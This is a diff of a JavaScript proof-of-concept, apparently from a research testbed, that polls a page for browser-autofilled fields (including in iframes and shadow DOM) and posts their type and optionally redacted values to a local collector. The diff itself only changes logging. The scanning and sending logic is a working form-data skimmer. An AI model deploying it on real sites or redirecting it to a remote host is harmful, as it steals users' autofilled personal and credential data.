@@ -67,26 +67,9 @@
     return s.length > 200 ? s.slice(0, 200) : s;
   }
 
-  function baseLogFields() {
-    const uaInfo = parseUserAgent();
-    return {
-      ts: new Date().toISOString().replace(/\.\d+Z$/, 'Z'),
-      local_ts: getLocalTs(),
-      event: '',
-      case_id: window.CASE_ID || '',
-      scenario: 'in-html',
-      browser: uaInfo.browser
-    };
-  }
-
-  function emit(event, extra = {}) {
-    const entry = {
-      ...baseLogFields(),
-      event,
-      ...extra
-    };
-
-    console.log(JSON.stringify(entry));
+  function log(msg) {
+    const t = new Date().toLocaleTimeString('en-US', { hour12: false });
+    console.log(`[PoC][${t}] ${msg}`);
   }
 
   // -----------------------------
@@ -157,9 +140,7 @@
           in_shadow: !!inp.___shadow_host
         });
       } catch (err) {
-        emit('warn', 'scan_field_error', {
-          error: String(err)
-        });
+        log('Scan: no autofilled inputs found');
       }
     }
 
@@ -170,14 +151,6 @@
   // collector
   // -----------------------------
   async function safePostLocal(envelope) {
-    emit('info', 'collector_request', {
-      payload_meta: {
-        case_id: envelope.case_id,
-        input_type: envelope.input_type,
-        technique: envelope.technique
-      }
-    });
-
     try {
       const res = await fetch(LOCAL_COLLECTOR, {
         method: 'POST',
@@ -189,21 +162,14 @@
       const text = await res.text().catch(() => '');
 
       if (!res.ok) {
-        emit('error', 'collector_response_error', {
-          status: res.status,
-          response_text: text || ''
-        });
+        log(`Collector non-2xx: ${res.status} ${res.statusText} ${text}`);
         return { ok: false, status: res.status, text };
       }
 
-      emit('info', 'collector_response_ok', {
-        status: res.status
-      });
+      log(`Collector OK: ${text || '(no body)'}`);
       return { ok: true, status: res.status, text };
     } catch (e) {
-      emit('error', 'collector_network_error', {
-        error: String(e)
-      });
+      log(`Send failed: ${String(e)}`);
       return { ok: false, status: 'network-error', err: String(e) };
     }
   }
@@ -213,42 +179,44 @@
   // -----------------------------
   async function exfiltrateOnce() {
     const found = findAutofilledInputs();
-
-    emit('info', 'scan_complete', {
-      found_count: found.length
-    });
-
-    if (!found.length) return;
+    if (!found || found.length === 0) {
+      log('Scan: no autofilled inputs found');
+      return;
+    }
 
     const uaInfo = parseUserAgent();
     const caseId = window.CASE_ID || '';
+    const scenario = window.SCENARIO || 'thirdParty_cdn';
 
     for (const f of found) {
-      try {
-        f.node.dataset.exfiltrated = '1';
-      } catch (_) {}
+      try { f.node.dataset.exfiltrated = '1'; } catch (e) {}
+
+      const now = new Date();
+      const local_ts = new Intl.DateTimeFormat('sv-SE', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false,
+        timeZone: USER_TZ
+      }).format(now).replace('T', ' ');
+
+      const timestamp = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
 
       const payload = {
-        timestamp: new Date().toISOString().replace(/\.\d+Z$/, 'Z'),
-        local_ts: getLocalTs(),
+        timestamp,
+        local_ts,
         case_id: caseId,
-        scenario: 'in-html',
+        scenario,
         browser: uaInfo.browser,
         input_type: f.inputType || null,
         technique: f.tech || null,
         value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null
       };
 
-      emit('info', 'autofill_detected', {
-        field_name: f.name,
-        input_type: f.inputType || null,
-        autocomplete: f.autocomplete,
-        technique: f.tech || null,
-        value_length: String(f.value || '').length,
-        in_iframe: f.in_iframe,
-        in_shadow: f.in_shadow
-      });
-
+      log(`Found field ${payload.input_type} (technique=${payload.technique}) — sending:${JSON.stringify(payload)}`);
       await safePostLocal(payload);
     }
   }
@@ -258,11 +226,11 @@
   // -----------------------------
   function startScanning(intervalMs) {
     if (timer) {
-      emit('warn', 'scanner_already_running', { interval_ms: intervalMs });
+      log(`Scanner already running, ignoring new start(${intervalMs})`);
       return;
     }
 
-    emit('info', 'scanner_start', { interval_ms: intervalMs });
+    log(`Started scanning every ${intervalMs} ms`);
     exfiltrateOnce();
     timer = setInterval(() => {
       exfiltrateOnce();
@@ -273,7 +241,7 @@
     if (!timer) return;
     clearInterval(timer);
     timer = null;
-    emit('info', 'scanner_stop');
+    log('Stopped scanning');
   }
 
   // -----------------------------
@@ -285,9 +253,8 @@
   ).then(() => {
     if (!window.TEST_ID) window.TEST_ID = DEFAULT_TEST_ID;
 
-    emit('info', 'bootstrap', {
-      default_interval_ms: DEFAULT_INTERVAL
-    });
+    log('PoC loaded (Background mode)');
+    log('Current Test ID: ' + window.TEST_ID);
   });
 
   window.addEventListener('load', () => {
